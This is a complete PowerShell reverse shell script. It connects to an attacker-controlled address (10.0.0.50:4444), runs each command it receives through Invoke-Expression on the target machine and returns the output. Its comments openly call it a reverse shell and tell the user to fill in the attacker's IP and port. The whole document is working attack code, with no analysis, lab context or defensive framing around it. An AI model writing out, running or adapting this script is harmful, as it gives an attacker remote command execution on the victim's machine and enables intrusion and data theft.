$ip = "10.0.0.50"      # Replace with your attacker's IP address
$port = 4444             # Replace with the port number you want to listen on

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

$writer.WriteLine("Connected to reverse shell!")

while ($true) {
    try {
        # Read commands from the listener (attacker)
        $command = $reader.ReadLine()

        if ($command -eq 'exit') {
            break
        }

        # Execute the command on the target machine
        $output = Invoke-Expression $command 2>&1
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Error: $_")
    }
}

$client.Close()
